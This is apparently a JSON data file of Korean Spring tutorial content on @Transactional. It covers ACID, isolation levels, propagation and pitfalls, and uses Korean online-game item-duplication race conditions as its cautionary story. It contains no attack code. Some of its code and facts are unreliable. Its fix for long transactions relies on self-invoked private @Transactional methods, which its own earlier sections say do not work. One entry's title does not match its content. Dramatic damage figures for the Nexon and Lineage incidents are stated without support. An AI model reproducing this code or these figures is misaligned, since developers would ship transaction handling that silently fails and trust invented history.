    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Transaction",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "08_트랜잭션/transaction-concept": {
    "id": "08_트랜잭션/transaction-concept",
    "title": "Transaction - 쇼핑몰 사장님을 파산시키고 싶지 않다면",
    "category": "spring",
    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "Spring Transaction으로 데이터 정합성을 보장합니다. 넥슨 아이템 복사 버그 사건에서 배우는 트랜잭션의 중요성.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "📜 [The History] - 트랜잭션이 없던 시절: 돈이 증발하다",
        "content": "2000년대 초반, 송금 시스템은 이렇게 작동했다:\n\n```\n[1단계] A의 통장에서 100만 원을 뺀다.\n[2단계] ... 여기서 정전이 난다면? 💥\n[3단계] B의 통장에 100만 원을 넣는다.\n```\n\n### 💀 결과\n\n- **A의 돈**: 100만 원 차감됨 ✅\n- **B의 돈**: 받지 못함 ❌\n- **100만 원**: **공중분해**\n\n이게 바로 \"데이터 불일치(Data Inconsistency)\" 문제다. 수많은 은행원이 밤새 수기로 장부를 맞춰야 했던 이유다.\n\n---\n\n## 🔁 트랜잭션 없는 세상의 악몽들\n\n**예시 1: 쇼핑몰**\n```java\n// ❌ 트랜잭션 없음\npublic void processOrder(Order order) {\n    // 1단계: 결제 처리\n    paymentService.charge(order);    // 성공 ✅\n    \n    // 2단계: 재고 차감 (여기서 에러 발생! 💥)\n    inventoryService.decrease(order); // 실패 ❌\n    \n    // 3단계: 배송 시작 (실행 안 됨)\n    deliveryService.ship(order);\n}\n```\n\n**결과**:\n- 고객 결제: **완료됨** (돈 받음)\n- 재고 차감: **실패** (에러)\n- 배송: **실행 안 됨**\n\n→ **돈은 받았는데 물건은 안 보냄** = 사기?\n\n---\n\n**예시 2: 은행 송금**\n```java\n// ❌ 트랜잭션 없음\npublic void transfer(Account from, Account to, int amount) {\n    from.withdraw(amount);  // A에서 출금 성공\n    \n    // 여기서 서버 다운! 💥\n    \n    to.deposit(amount);     // 실행 안 됨\n}\n```\n\n**결과**: A의 100만 원이 **증발**\n\n---\n\n**예시 3: 게임 아이템**\n```java\n// ❌ 트랜잭션 없음\npublic void moveItem(Long itemId) {\n    Item item = inventory.findById(itemId);\n    inventory.remove(item);  // 인벤토리에서 삭제\n    \n    // 0.1초 대기 중... 이 순간 두 번째 요청 들어옴!\n    \n    storage.add(item);       // 창고에 추가\n}\n```\n\n**결과**: 버튼 두 번 클릭 → 아이템 2개로 복사됨\n\n---\n\n## 🏦 실제 사례: 트랜잭션 없이는 은행도 못 믿는다\n\n트랜잭션 개념이 정립되기 전, **은행 전산 시스템은 하루에 수십 번 데이터 불일치**가 발생했다. 매일 밤 직원들이 수기로 장부를 대조하며 \"사라진 돈\"을 찾아야 했다.\n\nACID(Atomicity, Consistency, Isolation, Durability) 원칙이 정립된 후에야 비로소 **\"전부 성공 또는 전부 취소\"**라는 개념이 생겼다."
      },
      {
        "type": "concept",
        "title": "💀 [The Disaster] - 넥슨/리니지 아이템 복사 버그: 게임 경제 붕괴",
        "content": "```\n┌───────────────────────────────────────────────────────────────┐\n│  🚨 넥슨/리니지 아이템 복사 버그 (2000년대)                   │\n│  \"0.1초 내 버튼 두 번 클릭으로 게임 경제 붕괴\"                │\n│  피해: 게임 경제 하이퍼인플레이션, 수일간 롤백, 수십만 명 영향 │\n└───────────────────────────────────────────────────────────────┘\n```\n\n---\n\n## 📅 사건 개요\n\n**2000년대 초중반**, 대한민국 온라인 게임 역사를 뒤흔든 \"아이템 복사 버그\"의 대부분은 **트랜잭션과 락(Lock) 부재**에서 비롯되었다.\n\n### ❌ 문제의 코드\n\n```java\n// 넥슨/엔씨소프트 등 게임사의 전형적인 버그 패턴\n\npublic class ItemService {\n    \n    // ❌ @Transactional 없음!\n    // ❌ 동시성 제어 없음!\n    public void moveItemToStorage(Long userId, Long itemId) {\n        // 1단계: 인벤토리에서 아이템 조회\n        Item item = inventoryRepository.findByUserIdAndItemId(userId, itemId);\n        \n        if (item == null) {\n            throw new ItemNotFoundException();\n        }\n        \n        // 2단계: 인벤토리에서 삭제\n        inventoryRepository.delete(item);  // DB에서 삭제\n        \n        // ⚠️ 여기서 0.05초 대기... 치명적인 순간!\n        // 이 순간 두 번째 요청이 들어오면?\n        // → 아직 1단계에서 item을 찾을 수 있음!\n        // → 두 번째 요청도 delete() 성공!\n        \n        // 3단계: 창고에 추가\n        storageRepository.save(item);       // 창고에 저장\n    }\n}\n```\n\n---\n\n## 💥 공격 시나리오\n\n**유저가 \"창고에 넣기\" 버튼을 0.1초 간격으로 2번 클릭:**\n\n```\n[시간축]\n00.00초 - 첫 번째 클릭 → 요청 A 시작\n00.01초 - 두 번째 클릭 → 요청 B 시작\n\n[요청 A 처리]\n00.02초 - item 조회 (존재함 ✅)\n00.03초 - inventory.delete(item)\n00.04초 - [여기서 대기 중...]\n\n[요청 B 처리 - 동시 진행!]\n00.025초 - item 조회 (아직 존재함! ✅)  ← 문제 발생 지점\n00.035초 - inventory.delete(item) (또 성공!)\n\n[요청 A 계속]\n00.05초 - storage.save(item) → 아이템 1개 추가\n\n[요청 B 계속]\n00.055초 - storage.save(item) → 아이템 1개 또 추가!\n\n결과: 창고에 똑같은 아이템 2개 생성! 💥\n```\n\n---\n\n## 🔥 실제 피해 사례\n\n### 1️⃣ 리니지 \"드래곤 슬레이어\" 복사 버그 (2001년)\n\n- **아이템**: 드래곤 슬레이어 (당시 시세 약 300만 원)\n- **복사 방법**: 거래 중 서버 렉 이용\n- **결과**:\n  - 게임 경제 하이퍼인플레이션\n  - 정상 유저 이탈\n  - 엔씨소프트 긴급 서버 점검 3일\n  - 전체 아이템 거래 내역 롤백\n\n### 2️⃣ 메이플스토리 \"메소\" 복사 버그 (2000년대 중반)\n\n- **복사 대상**: 게임 화폐 \"메소\"\n- **방법**: 창고 이동 + 동시 클릭\n- **결과**:\n  - 인플레이션으로 게임 내 경제 붕괴\n  - 수십만 명 유저 영향\n  - 일주일간 롤백 작업\n\n### 3️⃣ 던전앤파이터 \"골드\" 복사 (2010년대 초반)\n\n- **피해액**: 추정 **100억 원** 규모 게임 내 자산 복제\n- **대응**: 전체 거래소 폐쇄 + 어뷰징 계정 영구 정지\n\n---\n\n## 🎯 핵심 원인 분석\n\n| 문제 요소 | 설명 |\n|----------|------|\n| **트랜잭션 없음** | 인벤토리 삭제와 창고 추가가 별개 작업 |\n| **락(Lock) 없음** | 동시 요청 차단 안 됨 |\n| **Race Condition** | 0.1초 내 두 요청이 같은 데이터 읽음 |\n| **Dirty Read** | 커밋 안 된 데이터 조회 가능 |\n\n---\n\n## 📊 피해 규모\n\n```\n┌────────────────────────────────────────┐\n│  피해 통계 (게임사 연합 추정)           │\n├────────────────────────────────────────┤\n│  영향받은 게임: 국내 주요 MMORPG 전부   │\n│  피해 유저: 수백만 명                   │\n│  복사된 아이템 가치: 수천억 원          │\n│  서버 롤백 횟수: 연간 수십 회           │\n└────────────────────────────────────────┘\n```\n\n---\n\n## 💡 교훈\n\n**\"트랜잭션 없이 중요한 데이터를 다루면, 유저는 버그를 찾아낸다.\"**\n\n게이머들은 **0.1초 타이밍**을 정확히 맞추는 연습을 수백 번 하며 버그를 재현했다. 개발자가 \"설마 이렇게까지 하겠어?\"라고 생각한 모든 것을 유저는 시도했다."
      },
      {
        "type": "concept",
        "title": "🛡️ [The Solution] Part 1 - Spring @Transactional: All or Nothing",
        "content": "Spring의 `@Transactional` 어노테이션은 **\"전부 성공하거나, 전부 없던 일로\"**를 보장한다.\n\n---\n\n## 🎯 ACID 원칙: 이게 깨지면 어떤 대참사가?\n\n### **A - Atomicity (원자성): \"전부 or 전무\"**\n\n**원칙**: 트랜잭션 내 모든 작업은 하나의 단위. 중간 상태는 존재하지 않는다.\n\n**깨지면 어떤 일이?**\n\n```java\n// ❌ Atomicity 없음\npublic void transferMoney(Long fromId, Long toId, int amount) {\n    accountRepository.withdraw(fromId, amount);  // 성공\n    // 💥 여기서 서버 다운!\n    accountRepository.deposit(toId, amount);     // 실행 안 됨\n}\n// 결과: A의 100만 원이 증발! 공중분해!\n```\n\n**✅ Spring이 보장하는 방법**:\n\n```java\n@Transactional\npublic void transferMoney(Long fromId, Long toId, int amount) {\n    accountRepository.withdraw(fromId, amount);\n    // 여기서 에러 나도 withdraw가 롤백됨!\n    accountRepository.deposit(toId, amount);\n    // 메서드 끝: 두 작업 모두 성공 → COMMIT\n    // 하나라도 실패 → 모두 ROLLBACK\n}\n```\n\n---\n\n### **C - Consistency (일관성): \"규칙을 지켜라\"**\n\n**원칙**: 트랜잭션 전후 데이터는 항상 유효한 상태여야 한다. 제약 조건 위반 불가.\n\n**깨지면 어떤 일이?**\n\n```java\n// ❌ Consistency 없음\npublic void createOrder(Order order) {\n    orderRepository.save(order);  // 주문 생성\n    // 재고 차감 안 함! → 재고 음수 가능\n}\n// 결과: 재고 0인데 주문 100건 → 제약 조건 깨짐\n```\n\n**✅ Spring이 보장하는 방법**:\n\n```java\n@Transactional\npublic void createOrder(Order order) {\n    Product product = productRepository.findById(order.getProductId());\n    \n    // 재고 검증\n    if (product.getStock() < order.getQuantity()) {\n        throw new OutOfStockException();  // 롤백!\n    }\n    \n    product.decreaseStock(order.getQuantity());\n    orderRepository.save(order);\n    // 재고 차감과 주문 생성이 원자적으로 실행 → 일관성 유지\n}\n```\n\n---\n\n### **I - Isolation (격리성): \"서로 보지 마\"**\n\n**원칙**: 동시에 실행되는 트랜잭션들은 서로 영향을 주지 않아야 한다.\n\n**깨지면 어떤 일이? → 게임 아이템 복사 버그!**\n\n```java\n// ❌ Isolation 없음 (기본 격리 수준으로는 불충분)\npublic void moveItem(Long itemId) {\n    Item item = repository.findById(itemId);  // 1번 요청: 조회\n    // 0.01초 대기...\n    // 2번 요청도 같은 시점에 조회! → 같은 아이템 2개 보임\n    repository.delete(item);  // 1번: 삭제\n    storage.save(item);       // 1번: 저장\n    // 2번도 delete + save 성공 → 아이템 복제됨!\n}\n```\n\n**깨지면 발생하는 3가지 문제**:\n\n**1. Dirty Read (더러운 읽기)**\n\n```\n트랜잭션 A: UPDATE 계좌 SET 잔액 = 0 (아직 커밋 안 함)\n트랜잭션 B: SELECT 잔액 → 0원 읽음\n트랜잭션 A: ROLLBACK! (취소)\n결과: B는 존재하지 않는 0원 기준으로 처리 → 데이터 오염\n```\n\n**2. Non-Repeatable Read (반복 불가 읽기)** ← 아이템 복사 원인!\n\n```\n트랜잭션 A: SELECT 재고 → 100개\nA가 처리 중...\n트랜잭션 B: UPDATE 재고 = 50, COMMIT\n트랜잭션 A: SELECT 재고 → 50개 (값이 바뀜!)\n결과: 같은 쿼리인데 다른 값 → 로직 오류\n```\n\n**3. Phantom Read (유령 읽기)**\n\n```\n트랜잭션 A: SELECT COUNT(*) WHERE 레벨 > 10 → 5명\n트랜잭션 B: INSERT 레벨 15 유저, COMMIT\n트랜잭션 A: SELECT COUNT(*) WHERE 레벨 > 10 → 6명\n결과: 없던 행이 유령처럼 등장\n```\n\n**✅ Spring Isolation Level로 해결**:\n\n| Isolation Level | Dirty Read | Non-Repeatable | Phantom | 성능 |\n|-----------------|------------|----------------|---------|------|\n| READ_UNCOMMITTED | 발생 O | 발생 O | 발생 O | 최고 |\n| **READ_COMMITTED** (기본) | **방지 O** | 발생 O | 발생 O | 높음 |\n| REPEATABLE_READ | 방지 O | **방지 O** | 발생 O | 보통 |\n| SERIALIZABLE | 방지 O | 방지 O | **방지 O** | 낮음 |\n\n```java\n// 아이템 복사 방지: SERIALIZABLE + 락\n@Transactional(isolation = Isolation.SERIALIZABLE)\npublic void moveItem(Long itemId) {\n    Item item = repository.findByIdWithLock(itemId);  // SELECT ... FOR UPDATE\n    repository.delete(item);\n    storage.save(item);\n    // 완전한 격리: 두 번째 요청은 첫 번째 완료까지 대기\n}\n```\n\n---\n\n### **D - Durability (영속성): \"커밋 = 영원\"**\n\n**원칙**: 커밋된 데이터는 시스템 장애에도 살아남아야 한다.\n\n**깨지면 어떤 일이?**\n\n```\n사용자: \"결제 완료\" 화면 확인\n시스템: COMMIT 성공!\n💥 1초 후 서버 정전\n재부팅 후: \"결제 내역이 없습니다\"\n결과: 돈은 빠져나갔는데 주문은 사라짐\n```\n\n**✅ Spring + DB가 보장하는 방법**:\n- WAL (Write-Ahead Logging): 커밋 전 디스크에 기록\n- 트랜잭션 로그: 복구 가능\n- Spring은 DB의 Durability를 신뢰하고 사용\n\n---\n\n## 📊 격리 수준 실전 선택 가이드\n\n| 상황 | 권장 Isolation | 이유 |\n|------|----------------|------|\n| 일반 CRUD | READ_COMMITTED | 성능과 안전성 균형 |\n| 결제/송금 | SERIALIZABLE + 락 | 완전한 격리 필수 |\n| 게임 아이템 거래 | SERIALIZABLE + 락 | 넥슨 사고 교훈 |\n| 재고 차감 | REPEATABLE_READ + 락 | 반복 읽기 일관성 |\n| 집계 쿼리 (리포트) | REPEATABLE_READ | 조회 중 데이터 변경 방지 |\n| 단순 조회 | READ_COMMITTED | 락 불필요 |\n\n---\n\n## ✅ 트랜잭션 적용: Before & After\n\n### ❌ Before (트랜잭션 없음)\n\n```java\n// ❌ 넥슨/리니지의 버그 패턴\n@Service\npublic class ItemService {\n    \n    // @Transactional 없음!\n    public void moveItemToStorage(Long userId, Long itemId) {\n        Item item = inventoryRepository.findByUserIdAndItemId(userId, itemId);\n        \n        // 1단계: 인벤토리에서 삭제\n        inventoryRepository.delete(item);  // 즉시 DB 반영\n        \n        // ⚠️ 여기서 0.05초 대기 중...\n        // 두 번째 요청이 들어오면?\n        // → 아직 삭제 안 된 것으로 보임! (Dirty Read)\n        \n        // 2단계: 창고에 추가\n        storageRepository.save(item);\n        \n        // 결과: 아이템 2개로 복사됨! 💥\n    }\n}\n```\n\n### ✅ After (트랜잭션 + 락 적용)\n\n```java\n// ✅ Spring @Transactional로 완벽 방어\n@Service\npublic class ItemService {\n    \n    @Transactional(isolation = Isolation.SERIALIZABLE)  // 완전 격리\n    public void moveItemToStorage(Long userId, Long itemId) {\n        // 비관적 락: 조회 즉시 행 잠금\n        Item item = inventoryRepository\n            .findByUserIdAndItemIdWithLock(userId, itemId);\n            // → SELECT ... FOR UPDATE (DB 레벨 잠금)\n        \n        if (item == null) {\n            throw new ItemNotFoundException();\n        }\n        \n        // 이제 다른 트랜잭션은 이 item에 접근 불가!\n        // 첫 번째 트랜잭션이 COMMIT할 때까지 대기\n        \n        // 1단계: 인벤토리에서 삭제\n        inventoryRepository.delete(item);\n        // → DB에 바로 반영 안 함! 트랜잭션 버퍼에만 기록\n        \n        // @Transactional 효과:\n        // 1. 이 메서드 전체가 하나의 작업 단위 (Atomicity)\n        // 2. 두 번째 요청은 첫 번째 완료까지 대기 (Isolation)\n        // 3. 중간에 에러 발생 시 전체 롤백 (Consistency)\n        // 4. 커밋 성공 시 영구 저장 (Durability)\n        \n        // 2단계: 창고에 추가\n        storageRepository.save(item);\n        \n        // 메서드 끝: 여기서 실제 DB 반영 (COMMIT)\n        // 에러 발생 시: 1, 2단계 모두 없던 일로 (ROLLBACK)\n    }\n}\n\n// Repository 설정\n@Query(\"SELECT i FROM Item i WHERE i.userId = :userId AND i.id = :itemId\")\n@Lock(LockModeType.PESSIMISTIC_WRITE)  // 쓰기 잠금\nOptional<Item> findByUserIdAndItemIdWithLock(Long userId, Long itemId);\n```\n\n**방어 메커니즘:**\n- ✅ **Atomicity**: delete와 save가 하나의 단위 → 중간 실패 시 전체 롤백\n- ✅ **Consistency**: 인벤토리와 창고의 총 아이템 개수 보존\n- ✅ **Isolation**: SERIALIZABLE + 비관적 락 → 완전한 격리\n- ✅ **Durability**: 커밋 성공 시 영구 저장"
      },
      {
        "type": "concept",
        "title": "🛡️ [The Solution] Part 2 - 전파 속성 & 실무 패턴",
        "content": "## 📊 트랜잭션 전파(Propagation) 속성\n\n**\"부모 트랜잭션이 있을 때, 자식은 어떻게 행동하나?\"**\n\n| 속성 | 설명 | 부모 트랜잭션 | 사용 예시 |\n|------|------|--------------|----------|\n| **REQUIRED** (기본) | 부모에 참여, 없으면 새로 생성 | 같은 트랜잭션 | 일반 비즈니스 로직 |\n| **REQUIRES_NEW** | 항상 새 트랜잭션 생성 | 별도 트랜잭션 | 독립 로그 저장 |\n| **MANDATORY** | 부모 필수 (없으면 에러) | 같은 트랜잭션 | 트랜잭션 내 전용 메서드 |\n| **NEVER** | 트랜잭션 없어야 함 | 트랜잭션 없음 | 조회 전용 |\n| SUPPORTS | 부모 있으면 참여, 없어도 됨 | 선택적 | 유연한 조회 |\n| NOT_SUPPORTED | 트랜잭션 중단 | 트랜잭션 없음 | 긴 배치 작업 |\n| NESTED | 중첩 트랜잭션 (세이브포인트) | 부모에 의존 | 부분 롤백 |\n\n---\n\n### **REQUIRED vs REQUIRES_NEW 실전 비교**\n\n#### **REQUIRED (기본값) - 같은 배를 타라**\n\n```java\n@Service\npublic class OrderService {\n    \n    @Transactional  // 부모 트랜잭션\n    public void processOrder(Order order) {\n        orderRepository.save(order);        // REQUIRED (같은 트랜잭션)\n        paymentService.charge(order);       // REQUIRED (같은 트랜잭션)\n        inventoryService.decrease(order);   // REQUIRED (같은 트랜잭션)\n        \n        // 셋 중 하나라도 실패 → 전체 롤백!\n        // \"같은 배에 탔으니 함께 살고 함께 죽는다\"\n    }\n}\n\n@Service\npublic class PaymentService {\n    @Transactional  // REQUIRED: 부모에 참여\n    public void charge(Order order) {\n        // OrderService의 트랜잭션에 참여\n    }\n}\n```\n\n**언제 사용?**\n- 일반적인 비즈니스 로직 (90%는 이거)\n- 여러 작업이 하나의 단위로 묶여야 할 때\n\n---\n\n#### **REQUIRES_NEW - 독립적인 배를 타라**\n\n```java\n@Service\npublic class OrderService {\n    \n    @Transactional  // 부모 트랜잭션\n    public void processOrder(Order order) {\n        paymentService.charge(order);  // 부모 트랜잭션\n        \n        auditService.log(order);       // REQUIRES_NEW (별도 트랜잭션)\n        \n        // ⚠️ audit 실패해도 payment는 커밋됨!\n        // \"각자의 배에 탔으니 독립적으로 산다\"\n    }\n}\n\n@Service\npublic class AuditService {\n    \n    @Transactional(propagation = Propagation.REQUIRES_NEW)\n    public void log(Order order) {\n        // 독립적인 트랜잭션\n        // 부모 실패해도 로그는 남음\n        // 로그 실패해도 부모는 커밋됨\n    }\n}\n```\n\n**언제 사용?**\n- 로그 저장 (메인 로직 실패해도 로그는 남겨야 함)\n- 이메일 발송 기록\n- 감사(Audit) 기록\n\n**⚠️ 주의사항**:\n```java\n@Transactional\npublic void processOrder(Order order) {\n    try {\n        payment(order);  // 성공\n        auditService.log(order);  // REQUIRES_NEW (별도 트랜잭션)\n    } catch (Exception e) {\n        // 💥 함정: audit 실패해도 payment는 이미 커밋됨!\n        // 롤백 안 됨!\n    }\n}\n```\n\n---\n\n### **MANDATORY - 반드시 트랜잭션 안에서만**\n\n```java\n@Service\npublic class PaymentService {\n    \n    @Transactional(propagation = Propagation.MANDATORY)\n    public void charge(Order order) {\n        // 부모 트랜잭션 없으면 IllegalTransactionStateException!\n    }\n}\n\n// ✅ 정상 호출\n@Transactional\npublic void processOrder(Order order) {\n    paymentService.charge(order);  // OK: 부모 트랜잭션 있음\n}\n\n// ❌ 에러 발생\npublic void processOrder(Order order) {\n    paymentService.charge(order);  // 에러! 부모 트랜잭션 없음\n}\n```\n\n**언제 사용?**\n- 반드시 트랜잭션 내에서만 호출되어야 하는 메서드\n- 독립 호출 방지\n\n---\n\n### **실전 패턴: 로그 저장 + 재시도**\n\n```java\n@Service\n@RequiredArgsConstructor\npublic class OrderService {\n    \n    private final PaymentService paymentService;\n    private final AuditService auditService;\n    \n    @Transactional\n    public void processOrder(Order order) {\n        \n        // 1. 결제 처리 (실패 시 전체 롤백)\n        paymentService.charge(order);\n        \n        // 2. 재고 차감 (실패 시 전체 롤백)\n        inventoryService.decrease(order);\n        \n        // 3. 주문 저장 (실패 시 전체 롤백)\n        orderRepository.save(order);\n        \n        // 4. 감사 로그 (별도 트랜잭션 - 실패해도 메인 로직 영향 없음)\n        try {\n            auditService.logOrderSuccess(order);\n        } catch (Exception e) {\n            // 로그 실패는 무시 (메인 로직은 성공)\n            log.warn(\"Audit log failed: {}\", e.getMessage());\n        }\n    }\n}\n\n@Service\npublic class AuditService {\n    \n    @Transactional(propagation = Propagation.REQUIRES_NEW)\n    @Retryable(maxAttempts = 3, backoff = @Backoff(delay = 100))\n    public void logOrderSuccess(Order order) {\n        AuditLog log = AuditLog.builder()\n            .orderId(order.getId())\n            .action(\"ORDER_SUCCESS\")\n            .timestamp(LocalDateTime.now())\n            .build();\n        auditRepository.save(log);\n        // 독립 트랜잭션 + 재시도 → 로그 저장 성공률 극대화\n    }\n}\n```\n\n---\n\n## 💡 핵심 원칙\n\n**트랜잭션을 사용해야 하는 경우:**\n- ✅ 돈 거래, 재고 변경, 포인트 적립/차감\n- ✅ 여러 테이블 동시 수정\n- ✅ 데이터 정합성이 중요한 모든 작업\n\n**트랜잭션 불필요한 경우:**\n- ❌ 단순 조회 (SELECT만)\n- ❌ 로그 저장 (실패해도 무관) → REQUIRES_NEW\n- ❌ 통계 집계 (정확도보다 성능 우선)\n\n**격리 수준 선택 기준:**\n- 일반 CRUD → READ_COMMITTED\n- 결제/송금 → SERIALIZABLE + 비관적 락\n- 게임 아이템 → SERIALIZABLE + 비관적 락 (넥슨 교훈)\n- 집계 쿼리 → REPEATABLE_READ\n\n---\n\n## ⚠️ 마지막 경고\n\n```\n┌──────────────────────────────────────────────────────┐\n│  \"돈이 오가는 곳에 @Transactional이 없다면,          │\n│   당신은 차기 넥슨 아이템 복사 버그의 주인공이다.\"  │\n│                                                      │\n│  - 트랜잭션 없음 = 데이터 복사/증발                 │\n│  - 격리 수준 낮음 = Race Condition = 게임 경제 붕괴 │\n│  - 한 줄의 @Transactional = 회사 생존               │\n└──────────────────────────────────────────────────────┘\n```"
      },
      {
        "type": "concept",
        "title": "⚠️ 실무 함정: @Transactional이 작동 안 하는 경우",
        "content": "## 🚨 함정 1: Self-Invocation (같은 클래스 내부 호출)\n\n### ❌ 작동 안 함!\n\n```java\n@Service\npublic class UserService {\n    \n    public void registerUser(User user) {\n        validateUser(user);  // ❌ 트랜잭션 적용 안 됨!\n        // 같은 클래스 내부 호출 → 프록시 우회\n    }\n    \n    @Transactional\n    private void validateUser(User user) {\n        // @Transactional이 있어도 작동 안 함!\n        // 이유: Spring AOP는 프록시 기반\n        // 내부 호출 시 프록시를 거치지 않음\n    }\n}\n```\n\n**왜 작동 안 하나?**\n\n```\n[정상적인 외부 호출]\nController → Spring Proxy → UserService.validateUser()\n             ↑ 여기서 @Transactional 적용\n\n[내부 호출 - 프록시 우회]\nUserService.registerUser() → UserService.validateUser()\n                             ↑ 프록시 거치지 않음 → 트랜잭션 적용 안 됨!\n```\n\n### ✅ 해결 방법\n\n**방법 1: 다른 Bean으로 분리**\n\n```java\n@Service\npublic class UserService {\n    \n    @Autowired\n    private ValidationService validationService;\n    \n    public void registerUser(User user) {\n        validationService.validate(user);  // ✅ 프록시 거침!\n    }\n}\n\n@Service\npublic class ValidationService {\n    \n    @Transactional\n    public void validate(User user) {\n        // 이제 트랜잭션 작동!\n    }\n}\n```\n\n**방법 2: Self-Injection**\n\n```java\n@Service\npublic class UserService {\n    \n    @Autowired\n    private UserService self;  // 자기 자신 주입\n    \n    public void registerUser(User user) {\n        self.validateUser(user);  // ✅ 프록시 거침!\n    }\n    \n    @Transactional\n    public void validateUser(User user) {\n        // 트랜잭션 작동!\n    }\n}\n```\n\n---\n\n## 🚨 함정 2: private 메서드에 @Transactional\n\n### ❌ 작동 안 함!\n\n```java\n@Service\npublic class OrderService {\n    \n    @Transactional  // ❌ private 메서드에는 적용 안 됨!\n    private void processPayment(Order order) {\n        // Spring AOP는 public 메서드만 프록시 가능\n    }\n}\n```\n\n### ✅ 해결 방법\n\n```java\n@Service\npublic class OrderService {\n    \n    @Transactional  // ✅ public으로 변경\n    public void processPayment(Order order) {\n        // 트랜잭션 작동!\n    }\n}\n```\n\n---\n\n## 🚨 함정 3: Checked Exception은 롤백 안 됨!\n\n### ❌ 롤백 안 됨!\n\n```java\n@Transactional\npublic void saveUser(User user) throws Exception {\n    userRepository.save(user);\n    \n    if (user.getAge() < 0) {\n        throw new Exception(\"나이 오류\");  // ❌ 롤백 안 됨!\n        // Checked Exception은 기본적으로 롤백 안 함\n    }\n}\n```\n\n**Spring 롤백 기본 규칙:**\n- **RuntimeException** (Unchecked) → 롤백 O\n- **Exception** (Checked) → 롤백 X\n\n### ✅ 해결 방법\n\n**방법 1: RuntimeException 사용**\n\n```java\n@Transactional\npublic void saveUser(User user) {\n    userRepository.save(user);\n    \n    if (user.getAge() < 0) {\n        throw new IllegalArgumentException(\"나이 오류\");  // ✅ 롤백됨!\n    }\n}\n```\n\n**방법 2: rollbackFor 명시**\n\n```java\n@Transactional(rollbackFor = Exception.class)\npublic void saveUser(User user) throws Exception {\n    userRepository.save(user);\n    \n    if (user.getAge() < 0) {\n        throw new Exception(\"나이 오류\");  // ✅ 롤백됨!\n    }\n}\n```\n\n---\n\n## 🚨 함정 4: 조회(readOnly=true)인데 수정하면?\n\n### ❌ 위험!\n\n```java\n@Transactional(readOnly = true)\npublic void updateUser(User user) {\n    User dbUser = userRepository.findById(user.getId());\n    dbUser.setName(user.getName());\n    userRepository.save(dbUser);  // ❌ 작동은 하지만 위험!\n    // DB에 따라 에러가 날 수도, 무시될 수도 있음\n}\n```\n\n**readOnly = true의 효과:**\n- Hibernate 플러시 모드 MANUAL → 성능 최적화\n- DB에 read-only 힌트 전달\n- **변경 작업 시 동작 보장 안 됨**\n\n### ✅ 해결 방법\n\n```java\n@Transactional  // readOnly 제거\npublic void updateUser(User user) {\n    User dbUser = userRepository.findById(user.getId());\n    dbUser.setName(user.getName());\n    userRepository.save(dbUser);  // ✅ 정상 작동\n}\n```\n\n---\n\n## 🚨 함정 5: 트랜잭션 너무 길면?\n\n### ❌ 성능 저하!\n\n```java\n@Transactional\npublic void processHugeOrder(Order order) {\n    // 1. DB 작업\n    orderRepository.save(order);\n    \n    // 2. 외부 API 호출 (5초 소요)\n    externalPaymentApi.charge(order);  // ❌ 트랜잭션 5초 유지!\n    \n    // 3. 이메일 발송 (3초 소요)\n    emailService.send(order);  // ❌ 트랜잭션 8초 유지!\n    \n    // 4. DB 작업\n    inventoryService.decrease(order);\n    \n    // 결과: 트랜잭션이 너무 길어짐 → DB 커넥션 고갈, 성능 저하\n}\n```\n\n### ✅ 해결 방법: 트랜잭션 분리\n\n```java\npublic void processHugeOrder(Order order) {\n    // 1. DB 작업만 트랜잭션\n    Long orderId = saveOrderInTransaction(order);\n    \n    // 2. 외부 API 호출 (트랜잭션 밖)\n    externalPaymentApi.charge(order);\n    \n    // 3. 이메일 발송 (트랜잭션 밖)\n    emailService.send(order);\n    \n    // 4. DB 작업만 트랜잭션\n    decreaseStockInTransaction(order);\n}\n\n@Transactional\nprivate Long saveOrderInTransaction(Order order) {\n    return orderRepository.save(order).getId();\n}\n\n@Transactional\nprivate void decreaseStockInTransaction(Order order) {\n    inventoryService.decrease(order);\n}\n```\n\n---\n\n## 📋 함정 회피 체크리스트\n\n**코드 리뷰 시 확인:**\n- [ ] @Transactional이 private 메서드에 있지 않은가?\n- [ ] 같은 클래스 내부에서 @Transactional 메서드를 호출하지 않는가?\n- [ ] Checked Exception을 던지면서 rollbackFor를 지정했는가?\n- [ ] readOnly=true인데 수정 작업을 하지 않는가?\n- [ ] 트랜잭션 안에서 외부 API 호출이나 긴 작업을 하지 않는가?\n- [ ] SERIALIZABLE + 락을 적절히 사용하고 있는가?\n\n**즉시 수정 대상:**\n```java\n// ❌ 이런 코드가 보이면 즉시 수정\n@Transactional\nprivate void updateUser() { ... }  // private 제거\n\npublic void register() {\n    validateUser();  // 다른 Bean으로 분리\n}\n\n@Transactional\npublic void save() throws Exception {  // rollbackFor 추가\n    throw new Exception();\n}\n```"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "완전한 게임 아이템 시스템 (버그 제로)",
        "code": "// 필요한 import 문들\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\nimport org.springframework.transaction.annotation.Isolation;\nimport org.springframework.transaction.annotation.Propagation;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport javax.persistence.*;\nimport java.time.LocalDateTime;\n\n// ═══════════════════════════════════════════════════════════\n// 게임 아이템 거래 시스템 - 넥슨 버그 완벽 방어\n// ═══════════════════════════════════════════════════════════\n\n@Entity\n@Table(name = \"items\")\npublic class Item {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    private Long userId;\n    private String itemCode;\n    private int quantity;\n    private String location;  // \"INVENTORY\" or \"STORAGE\"\n    \n    @Version  // 낙관적 락용\n    private Long version;\n}\n\n// ═══════════════════════════════════════════════════════════\n// Repository - 비관적 락 지원\n// ═══════════════════════════════════════════════════════════\n\n@Repository\npublic interface ItemRepository extends JpaRepository<Item, Long> {\n    \n    @Query(\"SELECT i FROM Item i WHERE i.userId = :userId AND i.id = :itemId AND i.location = 'INVENTORY'\")\n    @Lock(LockModeType.PESSIMISTIC_WRITE)  // 쓰기 잠금\n    Optional<Item> findInventoryItemWithLock(Long userId, Long itemId);\n    \n    @Query(\"SELECT i FROM Item i WHERE i.userId = :userId AND i.location = :location\")\n    List<Item> findByUserIdAndLocation(Long userId, String 